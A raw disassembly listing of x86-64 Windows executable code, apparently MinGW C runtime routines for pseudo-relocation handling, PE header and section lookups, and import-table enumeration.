  404e81:	0f 84 20 01 00 00    	je     0x404fa7
  404e87:	8b 44 24 54          	mov    0x54(%rsp),%eax
  404e8b:	83 f8 04             	cmp    $0x4,%eax
  404e8e:	0f 85 c1 00 00 00    	jne    0x404f55
  404e94:	83 05 e5 b5 15 00 01 	addl   $0x1,0x15b5e5(%rip)        # 0x560480
  404e9b:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  404ea1:	4c 89 ea             	mov    %r13,%rdx
  404ea4:	48 89 f1             	mov    %rsi,%rcx
  404ea7:	ff d3                	call   *%rbx
  404ea9:	48 85 c0             	test   %rax,%rax
  404eac:	0f 84 21 01 00 00    	je     0x404fd3
  404eb2:	8b 44 24 54          	mov    0x54(%rsp),%eax
  404eb6:	83 f8 04             	cmp    $0x4,%eax
  404eb9:	75 35                	jne    0x404ef0
  404ebb:	49 89 e8             	mov    %rbp,%r8
  404ebe:	48 89 fa             	mov    %rdi,%rdx
  404ec1:	48 89 f1             	mov    %rsi,%rcx
  404ec4:	48 83 c4 60          	add    $0x60,%rsp
  404ec8:	5b                   	pop    %rbx
  404ec9:	5e                   	pop    %rsi
  404eca:	5f                   	pop    %rdi
  404ecb:	5d                   	pop    %rbp
  404ecc:	41 5c                	pop    %r12
  404ece:	41 5d                	pop    %r13
  404ed0:	41 5e                	pop    %r14
  404ed2:	e9 f1 59 00 00       	jmp    0x40a8c8
  404ed7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404ede:	00 00 
  404ee0:	4c 8d 6c 24 30       	lea    0x30(%rsp),%r13
  404ee5:	48 8b 1d 70 d7 15 00 	mov    0x15d770(%rip),%rbx        # 0x56265c
  404eec:	eb ad                	jmp    0x404e9b
  404eee:	66 90                	xchg   %ax,%ax
  404ef0:	83 f8 40             	cmp    $0x40,%eax
  404ef3:	74 c6                	je     0x404ebb
  404ef5:	4c 8d 4c 24 2c       	lea    0x2c(%rsp),%r9
  404efa:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  404f00:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  404f05:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f0a:	48 8b 1d 43 d7 15 00 	mov    0x15d743(%rip),%rbx        # 0x562654
  404f11:	ff d3                	call   *%rbx
  404f13:	49 89 e8             	mov    %rbp,%r8
  404f16:	48 89 fa             	mov    %rdi,%rdx
  404f19:	48 89 f1             	mov    %rsi,%rcx
  404f1c:	e8 a7 59 00 00       	call   0x40a8c8
  404f21:	8b 44 24 54          	mov    0x54(%rsp),%eax
  404f25:	83 f8 40             	cmp    $0x40,%eax
  404f28:	74 1c                	je     0x404f46
  404f2a:	83 f8 04             	cmp    $0x4,%eax
  404f2d:	74 17                	je     0x404f46
  404f2f:	4c 8d 4c 24 2c       	lea    0x2c(%rsp),%r9
  404f34:	44 8b 44 24 2c       	mov    0x2c(%rsp),%r8d
  404f39:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  404f3e:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f43:	ff d3                	call   *%rbx
  404f45:	90                   	nop
  404f46:	48 83 c4 60          	add    $0x60,%rsp
  404f4a:	5b                   	pop    %rbx
  404f4b:	5e                   	pop    %rsi
  404f4c:	5f                   	pop    %rdi
  404f4d:	5d                   	pop    %rbp
  404f4e:	41 5c                	pop    %r12
  404f50:	41 5d                	pop    %r13
  404f52:	41 5e                	pop    %r14
  404f54:	c3                   	ret
  404f55:	83 f8 40             	cmp    $0x40,%eax
  404f58:	0f 84 36 ff ff ff    	je     0x404e94
  404f5e:	4c 8b 0d 13 b5 15 00 	mov    0x15b513(%rip),%r9        # 0x560478
  404f65:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  404f6b:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  404f70:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f75:	4d 01 f1             	add    %r14,%r9
  404f78:	ff 15 d6 d6 15 00    	call   *0x15d6d6(%rip)        # 0x562654
  404f7e:	85 c0                	test   %eax,%eax
  404f80:	0f 85 0e ff ff ff    	jne    0x404e94
  404f86:	ff 15 d8 d5 15 00    	call   *0x15d5d8(%rip)        # 0x562564
  404f8c:	48 8d 0d 15 88 15 00 	lea    0x158815(%rip),%rcx        # 0x55d7a8
  404f93:	89 c2                	mov    %eax,%edx
  404f95:	e8 c6 fd ff ff       	call   0x404d60
  404f9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404fa0:	31 db                	xor    %ebx,%ebx
  404fa2:	e9 70 fe ff ff       	jmp    0x404e17
  404fa7:	48 8b 05 ca b4 15 00 	mov    0x15b4ca(%rip),%rax        # 0x560478
  404fae:	41 8b 54 24 08       	mov    0x8(%r12),%edx
  404fb3:	48 8d 0d b6 87 15 00 	lea    0x1587b6(%rip),%rcx        # 0x55d770
  404fba:	4e 8b 44 30 08       	mov    0x8(%rax,%r14,1),%r8
  404fbf:	e8 9c fd ff ff       	call   0x404d60
  404fc4:	48 8d 0d 85 87 15 00 	lea    0x158785(%rip),%rcx        # 0x55d750
  404fcb:	48 89 f2             	mov    %rsi,%rdx
  404fce:	e8 8d fd ff ff       	call   0x404d60
  404fd3:	48 8d 0d 96 87 15 00 	lea    0x158796(%rip),%rcx        # 0x55d770
  404fda:	49 89 f0             	mov    %rsi,%r8
  404fdd:	ba 30 00 00 00       	mov    $0x30,%edx
  404fe2:	e8 79 fd ff ff       	call   0x404d60
  404fe7:	90                   	nop
  404fe8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  404fef:	00 
  404ff0:	55                   	push   %rbp
  404ff1:	48 89 e5             	mov    %rsp,%rbp
  404ff4:	41 54                	push   %r12
  404ff6:	57                   	push   %rdi
  404ff7:	56                   	push   %rsi
  404ff8:	53                   	push   %rbx
  404ff9:	48 83 ec 60          	sub    $0x60,%rsp
  404ffd:	8b 1d 6d b4 15 00    	mov    0x15b46d(%rip),%ebx        # 0x560470
  405003:	85 db                	test   %ebx,%ebx
  405005:	74 0b                	je     0x405012
  405007:	48 8d 65 e0          	lea    -0x20(%rbp),%rsp
  40500b:	5b                   	pop    %rbx
  40500c:	5e                   	pop    %rsi
  40500d:	5f                   	pop    %rdi
  40500e:	41 5c                	pop    %r12
  405010:	5d                   	pop    %rbp
  405011:	c3                   	ret
  405012:	c7 05 54 b4 15 00 01 	movl   $0x1,0x15b454(%rip)        # 0x560470
  405019:	00 00 00 
  40501c:	e8 0f 04 00 00       	call   0x405430
  405021:	48 98                	cltq
  405023:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  405027:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
  40502e:	00 
  40502f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  405033:	e8 38 0b 00 00       	call   0x405b70
  405038:	48 8d 35 31 8c 15 00 	lea    0x158c31(%rip),%rsi        # 0x55dc70
  40503f:	48 8d 1d 2a 8c 15 00 	lea    0x158c2a(%rip),%rbx        # 0x55dc70
  405046:	c7 05 30 b4 15 00 00 	movl   $0x0,0x15b430(%rip)        # 0x560480
  40504d:	00 00 00 
  405050:	48 29 c4             	sub    %rax,%rsp
  405053:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  405058:	48 89 05 19 b4 15 00 	mov    %rax,0x15b419(%rip)        # 0x560478
  40505f:	48 89 f0             	mov    %rsi,%rax
  405062:	48 29 d8             	sub    %rbx,%rax
  405065:	48 83 f8 07          	cmp    $0x7,%rax
  405069:	7e 9c                	jle    0x405007
  40506b:	48 83 f8 0b          	cmp    $0xb,%rax
  40506f:	7e 33                	jle    0x4050a4
  405071:	44 8b 1d f8 8b 15 00 	mov    0x158bf8(%rip),%r11d        # 0x55dc70
  405078:	45 85 db             	test   %r11d,%r11d
  40507b:	0f 85 9f 00 00 00    	jne    0x405120
  405081:	44 8b 15 ec 8b 15 00 	mov    0x158bec(%rip),%r10d        # 0x55dc74
  405088:	45 85 d2             	test   %r10d,%r10d
  40508b:	0f 85 8f 00 00 00    	jne    0x405120
  405091:	44 8b 0d e0 8b 15 00 	mov    0x158be0(%rip),%r9d        # 0x55dc78
  405098:	45 85 c9             	test   %r9d,%r9d
  40509b:	75 16                	jne    0x4050b3
  40509d:	48 8d 1d d8 8b 15 00 	lea    0x158bd8(%rip),%rbx        # 0x55dc7c
  4050a4:	44 8b 03             	mov    (%rbx),%r8d
  4050a7:	45 85 c0             	test   %r8d,%r8d
  4050aa:	75 74                	jne    0x405120
  4050ac:	8b 4b 04             	mov    0x4(%rbx),%ecx
  4050af:	85 c9                	test   %ecx,%ecx
  4050b1:	75 6d                	jne    0x405120
  4050b3:	8b 53 08             	mov    0x8(%rbx),%edx
  4050b6:	83 fa 01             	cmp    $0x1,%edx
  4050b9:	0f 85 0e 02 00 00    	jne    0x4052cd
  4050bf:	48 83 c3 0c          	add    $0xc,%rbx
  4050c3:	48 39 f3             	cmp    %rsi,%rbx
  4050c6:	0f 83 3b ff ff ff    	jae    0x405007
  4050cc:	48 8d 3d 2d af ff ff 	lea    -0x50d3(%rip),%rdi        # 0x400000
  4050d3:	49 bc 00 00 00 00 ff 	movabs $0xffffffff00000000,%r12
  4050da:	ff ff ff 
  4050dd:	8b 4b 04             	mov    0x4(%rbx),%ecx
  4050e0:	8b 03                	mov    (%rbx),%eax
  4050e2:	0f b6 53 08          	movzbl 0x8(%rbx),%edx
  4050e6:	48 01 f8             	add    %rdi,%rax
  4050e9:	48 01 f9             	add    %rdi,%rcx
  4050ec:	83 fa 10             	cmp    $0x10,%edx
  4050ef:	4c 8b 00             	mov    (%rax),%r8
  4050f2:	0f 84 1d 01 00 00    	je     0x405215
  4050f8:	0f 87 da 00 00 00    	ja     0x4051d8
  4050fe:	83 fa 08             	cmp    $0x8,%edx
  405101:	0f 84 43 01 00 00    	je     0x40524a
  405107:	48 8d 0d fa 86 15 00 	lea    0x1586fa(%rip),%rcx        # 0x55d808
  40510e:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  405115:	00 
  405116:	e8 45 fc ff ff       	call   0x404d60
  40511b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  405120:	48 39 f3             	cmp    %rsi,%rbx
  405123:	0f 83 de fe ff ff    	jae    0x405007
  405129:	48 8d 3d d0 ae ff ff 	lea    -0x5130(%rip),%rdi        # 0x400000
  405130:	8b 4b 04             	mov    0x4(%rbx),%ecx
  405133:	48 8d 55 a4          	lea    -0x5c(%rbp),%rdx
  405137:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  40513d:	48 01 f9             	add    %rdi,%rcx
  405140:	8b 01                	mov    (%rcx),%eax
  405142:	03 03                	add    (%rbx),%eax
  405144:	48 83 c3 08          	add    $0x8,%rbx
  405148:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  40514b:	e8 70 fc ff ff       	call   0x404dc0
  405150:	48 39 f3             	cmp    %rsi,%rbx
  405153:	72 db                	jb     0x405130
  405155:	8b 05 25 b3 15 00    	mov    0x15b325(%rip),%eax        # 0x560480
  40515b:	31 db                	xor    %ebx,%ebx
  40515d:	31 f6                	xor    %esi,%esi
  40515f:	85 c0                	test   %eax,%eax
  405161:	0f 8e a0 fe ff ff    	jle    0x405007
  405167:	4c 8b 25 ee d4 15 00 	mov    0x15d4ee(%rip),%r12        # 0x56265c
  40516e:	48 8b 3d df d4 15 00 	mov    0x15d4df(%rip),%rdi        # 0x562654
  405175:	eb 1c                	jmp    0x405193
  405177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40517e:	00 00 
  405180:	83 c6 01             	add    $0x1,%esi
  405183:	48 83 c3 18          	add    $0x18,%rbx
  405187:	3b 35 f3 b2 15 00    	cmp    0x15b2f3(%rip),%esi        # 0x560480
  40518d:	0f 8d 74 fe ff ff    	jge    0x405007
  405193:	48 8b 05 de b2 15 00 	mov    0x15b2de(%rip),%rax        # 0x560478
  40519a:	48 01 d8             	add    %rbx,%rax
  40519d:	8b 10                	mov    (%rax),%edx
  40519f:	85 d2                	test   %edx,%edx
  4051a1:	74 dd                	je     0x405180
  4051a3:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4051a7:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  4051ad:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
  4051b1:	41 ff d4             	call   *%r12
  4051b4:	48 85 c0             	test   %rax,%rax
  4051b7:	0f 84 f2 00 00 00    	je     0x4052af
  4051bd:	48 8b 05 b4 b2 15 00 	mov    0x15b2b4(%rip),%rax        # 0x560478
  4051c4:	4c 8d 4d a4          	lea    -0x5c(%rbp),%r9
  4051c8:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  4051cc:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
  4051d0:	44 8b 04 18          	mov    (%rax,%rbx,1),%r8d
  4051d4:	ff d7                	call   *%rdi
  4051d6:	eb a8                	jmp    0x405180
  4051d8:	83 fa 20             	cmp    $0x20,%edx
  4051db:	0f 84 9d 00 00 00    	je     0x40527e
  4051e1:	83 fa 40             	cmp    $0x40,%edx
  4051e4:	0f 85 1d ff ff ff    	jne    0x405107
  4051ea:	49 29 c0             	sub    %rax,%r8
  4051ed:	4c 03 01             	add    (%rcx),%r8
  4051f0:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  4051f4:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  4051f8:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4051fe:	e8 bd fb ff ff       	call   0x404dc0
  405203:	48 83 c3 0c          	add    $0xc,%rbx
  405207:	48 39 f3             	cmp    %rsi,%rbx
  40520a:	0f 82 cd fe ff ff    	jb     0x4050dd
  405210:	e9 40 ff ff ff       	jmp    0x405155
  405215:	44 0f b7 09          	movzwl (%rcx),%r9d
  405219:	41 0f b7 d1          	movzwl %r9w,%edx
  40521d:	49 89 d2             	mov    %rdx,%r10
  405220:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  405227:	66 45 85 c9          	test   %r9w,%r9w
  40522b:	49 0f 48 d2          	cmovs  %r10,%rdx
  40522f:	48 29 c2             	sub    %rax,%rdx
  405232:	4c 01 c2             	add    %r8,%rdx
  405235:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  40523b:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  40523f:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  405243:	e8 78 fb ff ff       	call   0x404dc0
  405248:	eb b9                	jmp    0x405203
  40524a:	44 0f b6 09          	movzbl (%rcx),%r9d
  40524e:	41 0f b6 d1          	movzbl %r9b,%edx
  405252:	49 89 d2             	mov    %rdx,%r10
  405255:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  40525c:	45 84 c9             	test   %r9b,%r9b
  40525f:	49 0f 48 d2          	cmovs  %r10,%rdx
  405263:	48 29 c2             	sub    %rax,%rdx
  405266:	4c 01 c2             	add    %r8,%rdx
  405269:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40526f:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  405273:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  405277:	e8 44 fb ff ff       	call   0x404dc0
  40527c:	eb 85                	jmp    0x405203
  40527e:	44 8b 09             	mov    (%rcx),%r9d
  405281:	44 89 ca             	mov    %r9d,%edx
  405284:	49 89 d2             	mov    %rdx,%r10
  405287:	4d 09 e2             	or     %r12,%r10
  40528a:	45 85 c9             	test   %r9d,%r9d
  40528d:	49 0f 48 d2          	cmovs  %r10,%rdx
  405291:	48 29 c2             	sub    %rax,%rdx
  405294:	4c 01 c2             	add    %r8,%rdx
  405297:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  40529d:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  4052a1:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  4052a5:	e8 16 fb ff ff       	call   0x404dc0
  4052aa:	e9 54 ff ff ff       	jmp    0x405203
  4052af:	48 03 1d c2 b1 15 00 	add    0x15b1c2(%rip),%rbx        # 0x560478
  4052b6:	48 8d 0d b3 84 15 00 	lea    0x1584b3(%rip),%rcx        # 0x55d770
  4052bd:	48 8b 43 10          	mov    0x10(%rbx),%rax
  4052c1:	4c 8b 43 08          	mov    0x8(%rbx),%r8
  4052c5:	8b 50 08             	mov    0x8(%rax),%edx
  4052c8:	e8 93 fa ff ff       	call   0x404d60
  4052cd:	48 8d 0d fc 84 15 00 	lea    0x1584fc(%rip),%rcx        # 0x55d7d0
  4052d4:	e8 87 fa ff ff       	call   0x404d60
  4052d9:	90                   	nop
  4052da:	90                   	nop
  4052db:	90                   	nop
  4052dc:	90                   	nop
  4052dd:	90                   	nop
  4052de:	90                   	nop
  4052df:	90                   	nop
  4052e0:	31 c0                	xor    %eax,%eax
  4052e2:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  4052e7:	74 07                	je     0x4052f0
  4052e9:	f3 c3                	repz ret
  4052eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4052f0:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
  4052f4:	48 01 d1             	add    %rdx,%rcx
  4052f7:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
  4052fd:	75 ea                	jne    0x4052e9
  4052ff:	31 c0                	xor    %eax,%eax
  405301:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
  405307:	0f 94 c0             	sete   %al
  40530a:	c3                   	ret
  40530b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  405310:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  405314:	48 01 c1             	add    %rax,%rcx
  405317:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  40531b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  405320:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  405324:	85 c9                	test   %ecx,%ecx
  405326:	74 28                	je     0x405350
  405328:	8d 49 ff             	lea    -0x1(%rcx),%ecx
  40532b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  40532f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  405334:	8b 48 0c             	mov    0xc(%rax),%ecx
  405337:	41 89 c8             	mov    %ecx,%r8d
  40533a:	49 39 d0             	cmp    %rdx,%r8
  40533d:	77 08                	ja     0x405347
  40533f:	03 48 08             	add    0x8(%rax),%ecx
  405342:	48 39 ca             	cmp    %rcx,%rdx
  405345:	72 0b                	jb     0x405352
  405347:	48 83 c0 28          	add    $0x28,%rax
  40534b:	4c 39 c8             	cmp    %r9,%rax
  40534e:	75 e4                	jne    0x405334
  405350:	31 c0                	xor    %eax,%eax
  405352:	f3 c3                	repz ret
  405354:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  40535b:	00 00 00 00 00 
  405360:	57                   	push   %rdi
  405361:	56                   	push   %rsi
  405362:	53                   	push   %rbx
  405363:	48 83 ec 20          	sub    $0x20,%rsp
  405367:	48 89 ce             	mov    %rcx,%rsi
  40536a:	e8 69 55 00 00       	call   0x40a8d8
  40536f:	48 83 f8 08          	cmp    $0x8,%rax
  405373:	77 6b                	ja     0x4053e0
  405375:	48 8d 0d 84 ac ff ff 	lea    -0x537c(%rip),%rcx        # 0x400000
  40537c:	e8 5f ff ff ff       	call   0x4052e0
  405381:	85 c0                	test   %eax,%eax
  405383:	74 5b                	je     0x4053e0
  405385:	48 63 15 b0 ac ff ff 	movslq -0x5350(%rip),%rdx        # 0x40003c
  40538c:	48 8d 05 6d ac ff ff 	lea    -0x5393(%rip),%rax        # 0x400000
  405393:	48 01 d0             	add    %rdx,%rax
  405396:	0f b7 50 14          	movzwl 0x14(%rax),%edx
  40539a:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
  40539f:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  4053a3:	85 c0                	test   %eax,%eax
  4053a5:	74 39                	je     0x4053e0
  4053a7:	8d 40 ff             	lea    -0x1(%rax),%eax
  4053aa:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  4053ae:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
  4053b3:	eb 09                	jmp    0x4053be
  4053b5:	48 83 c3 28          	add    $0x28,%rbx
  4053b9:	48 39 fb             	cmp    %rdi,%rbx
  4053bc:	74 22                	je     0x4053e0
  4053be:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4053c4:	48 89 f2             	mov    %rsi,%rdx
  4053c7:	48 89 d9             	mov    %rbx,%rcx
  4053ca:	e8 e1 55 00 00       	call   0x40a9b0
  4053cf:	85 c0                	test   %eax,%eax
  4053d1:	75 e2                	jne    0x4053b5
  4053d3:	48 89 d8             	mov    %rbx,%rax
  4053d6:	48 83 c4 20          	add    $0x20,%rsp
  4053da:	5b                   	pop    %rbx
  4053db:	5e                   	pop    %rsi
  4053dc:	5f                   	pop    %rdi
  4053dd:	c3                   	ret
  4053de:	66 90                	xchg   %ax,%ax
  4053e0:	31 db                	xor    %ebx,%ebx
  4053e2:	48 89 d8             	mov    %rbx,%rax
  4053e5:	48 83 c4 20          	add    $0x20,%rsp
  4053e9:	5b                   	pop    %rbx
  4053ea:	5e                   	pop    %rsi
  4053eb:	5f                   	pop    %rdi
  4053ec:	c3                   	ret
  4053ed:	0f 1f 00             	nopl   (%rax)
  4053f0:	53                   	push   %rbx
  4053f1:	48 83 ec 20          	sub    $0x20,%rsp
  4053f5:	48 89 cb             	mov    %rcx,%rbx
  4053f8:	48 8d 0d 01 ac ff ff 	lea    -0x53ff(%rip),%rcx        # 0x400000
  4053ff:	e8 dc fe ff ff       	call   0x4052e0
  405404:	85 c0                	test   %eax,%eax
  405406:	74 18                	je     0x405420
  405408:	48 8d 0d f1 ab ff ff 	lea    -0x540f(%rip),%rcx        # 0x400000
  40540f:	48 89 da             	mov    %rbx,%rdx
  405412:	48 29 ca             	sub    %rcx,%rdx
  405415:	48 83 c4 20          	add    $0x20,%rsp
  405419:	5b                   	pop    %rbx
  40541a:	e9 f1 fe ff ff       	jmp    0x405310
  40541f:	90                   	nop
  405420:	31 c0                	xor    %eax,%eax
  405422:	48 83 c4 20          	add    $0x20,%rsp
  405426:	5b                   	pop    %rbx
  405427:	c3                   	ret
  405428:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40542f:	00 
  405430:	48 83 ec 28          	sub    $0x28,%rsp
  405434:	48 8d 0d c5 ab ff ff 	lea    -0x543b(%rip),%rcx        # 0x400000
  40543b:	e8 a0 fe ff ff       	call   0x4052e0
  405440:	31 d2                	xor    %edx,%edx
  405442:	85 c0                	test   %eax,%eax
  405444:	74 13                	je     0x405459
  405446:	48 63 05 ef ab ff ff 	movslq -0x5411(%rip),%rax        # 0x40003c
  40544d:	48 8d 15 ac ab ff ff 	lea    -0x5454(%rip),%rdx        # 0x400000
  405454:	0f b7 54 02 06       	movzwl 0x6(%rdx,%rax,1),%edx
  405459:	89 d0                	mov    %edx,%eax
  40545b:	48 83 c4 28          	add    $0x28,%rsp
  40545f:	c3                   	ret
  405460:	53                   	push   %rbx
  405461:	48 83 ec 20          	sub    $0x20,%rsp
  405465:	48 89 cb             	mov    %rcx,%rbx
  405468:	48 8d 0d 91 ab ff ff 	lea    -0x546f(%rip),%rcx        # 0x400000
  40546f:	e8 6c fe ff ff       	call   0x4052e0
  405474:	85 c0                	test   %eax,%eax
  405476:	74 50                	je     0x4054c8
  405478:	48 63 15 bd ab ff ff 	movslq -0x5443(%rip),%rdx        # 0x40003c
  40547f:	48 8d 05 7a ab ff ff 	lea    -0x5486(%rip),%rax        # 0x400000
  405486:	48 01 c2             	add    %rax,%rdx
  405489:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
  40548d:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
  405492:	0f b7 52 06          	movzwl 0x6(%rdx),%edx
  405496:	85 d2                	test   %edx,%edx
  405498:	74 2e                	je     0x4054c8
  40549a:	8d 52 ff             	lea    -0x1(%rdx),%edx
  40549d:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  4054a1:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
  4054a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4054ad:	00 00 00 
  4054b0:	f6 40 27 20          	testb  $0x20,0x27(%rax)
  4054b4:	74 09                	je     0x4054bf
  4054b6:	48 85 db             	test   %rbx,%rbx
  4054b9:	74 0f                	je     0x4054ca
  4054bb:	48 83 eb 01          	sub    $0x1,%rbx
  4054bf:	48 83 c0 28          	add    $0x28,%rax
  4054c3:	48 39 d0             	cmp    %rdx,%rax
  4054c6:	75 e8                	jne    0x4054b0
  4054c8:	31 c0                	xor    %eax,%eax
  4054ca:	48 83 c4 20          	add    $0x20,%rsp
  4054ce:	5b                   	pop    %rbx
  4054cf:	c3                   	ret
  4054d0:	48 83 ec 28          	sub    $0x28,%rsp
  4054d4:	48 8d 0d 25 ab ff ff 	lea    -0x54db(%rip),%rcx        # 0x400000
  4054db:	e8 00 fe ff ff       	call   0x4052e0
  4054e0:	31 d2                	xor    %edx,%edx
  4054e2:	85 c0                	test   %eax,%eax
  4054e4:	48 8d 05 15 ab ff ff 	lea    -0x54eb(%rip),%rax        # 0x400000
  4054eb:	48 0f 45 d0          	cmovne %rax,%rdx
  4054ef:	48 89 d0             	mov    %rdx,%rax
  4054f2:	48 83 c4 28          	add    $0x28,%rsp
  4054f6:	c3                   	ret
  4054f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4054fe:	00 00 
  405500:	56                   	push   %rsi
  405501:	53                   	push   %rbx
  405502:	48 83 ec 28          	sub    $0x28,%rsp
  405506:	31 db                	xor    %ebx,%ebx
  405508:	48 89 ce             	mov    %rcx,%rsi
  40550b:	48 8d 0d ee aa ff ff 	lea    -0x5512(%rip),%rcx        # 0x400000
  405512:	e8 c9 fd ff ff       	call   0x4052e0
  405517:	85 c0                	test   %eax,%eax
  405519:	75 09                	jne    0x405524
  40551b:	89 d8                	mov    %ebx,%eax
  40551d:	48 83 c4 28          	add    $0x28,%rsp
  405521:	5b                   	pop    %rbx
  405522:	5e                   	pop    %rsi
  405523:	c3                   	ret
  405524:	48 8d 0d d5 aa ff ff 	lea    -0x552b(%rip),%rcx        # 0x400000
  40552b:	48 89 f2             	mov    %rsi,%rdx
  40552e:	48 29 ca             	sub    %rcx,%rdx
  405531:	e8 da fd ff ff       	call   0x405310
  405536:	48 85 c0             	test   %rax,%rax
  405539:	74 e0                	je     0x40551b
  40553b:	8b 58 24             	mov    0x24(%rax),%ebx
  40553e:	f7 d3                	not    %ebx
  405540:	c1 eb 1f             	shr    $0x1f,%ebx
  405543:	89 d8                	mov    %ebx,%eax
  405545:	48 83 c4 28          	add    $0x28,%rsp
  405549:	5b                   	pop    %rbx
  40554a:	5e                   	pop    %rsi
  40554b:	c3                   	ret
  40554c:	0f 1f 40 00          	nopl   0x0(%rax)
  405550:	55                   	push   %rbp
  405551:	57                   	push   %rdi
  405552:	56                   	push   %rsi
  405553:	53                   	push   %rbx
  405554:	48 83 ec 28          	sub    $0x28,%rsp
  405558:	89 cb                	mov    %ecx,%ebx
  40555a:	48 8d 0d 9f aa ff ff 	lea    -0x5561(%rip),%rcx        # 0x400000
  405561:	e8 7a fd ff ff       	call   0x4052e0
  405566:	85 c0                	test   %eax,%eax
  405568:	74 66                	je     0x4055d0
  40556a:	48 63 05 cb aa ff ff 	movslq -0x5535(%rip),%rax        # 0x40003c
  405571:	48 8d 35 88 aa ff ff 	lea    -0x5578(%rip),%rsi        # 0x400000
  405578:	31 ed                	xor    %ebp,%ebp
  40557a:	8b bc 06 90 00 00 00 	mov    0x90(%rsi,%rax,1),%edi
  405581:	85 ff                	test   %edi,%edi
  405583:	74 3a                	je     0x4055bf
  405585:	48 89 fa             	mov    %rdi,%rdx
  405588:	48 89 f1             	mov    %rsi,%rcx
  40558b:	e8 80 fd ff ff       	call   0x405310
  405590:	48 85 c0             	test   %rax,%rax
  405593:	74 2a                	je     0x4055bf
  405595:	48 89 fa             	mov    %rdi,%rdx
  405598:	48 01 f2             	add    %rsi,%rdx
  40559b:	75 0a                	jne    0x4055a7
  40559d:	eb 20                	jmp    0x4055bf
  40559f:	90                   	nop
  4055a0:	83 eb 01             	sub    $0x1,%ebx
  4055a3:	48 83 c2 14          	add    $0x14,%rdx
  4055a7:	8b 4a 04             	mov    0x4(%rdx),%ecx
  4055aa:	85 c9                	test   %ecx,%ecx
  4055ac:	75 07                	jne    0x4055b5
  4055ae:	8b 42 0c             	mov    0xc(%rdx),%eax
  4055b1:	85 c0                	test   %eax,%eax
  4055b3:	74 1b                	je     0x4055d0
  4055b5:	85 db                	test   %ebx,%ebx
  4055b7:	7f e7                	jg     0x4055a0
  4055b9:	8b 6a 0c             	mov    0xc(%rdx),%ebp
  4055bc:	48 01 f5             	add    %rsi,%rbp
  4055bf:	48 89 e8             	mov    %rbp,%rax
  4055c2:	48 83 c4 28          	add    $0x28,%rsp
  4055c6:	5b                   	pop    %rbx
  4055c7:	5e                   	pop    %rsi
  4055c8:	5f                   	pop    %rdi
  4055c9:	5d                   	pop    %rbp
  4055ca:	c3                   	ret
  4055cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4055d0:	31 ed                	xor    %ebp,%ebp
  4055d2:	48 89 e8             	mov    %rbp,%rax
  4055d5:	48 83 c4 28          	add    $0x28,%rsp
  4055d9:	5b                   	pop    %rbx
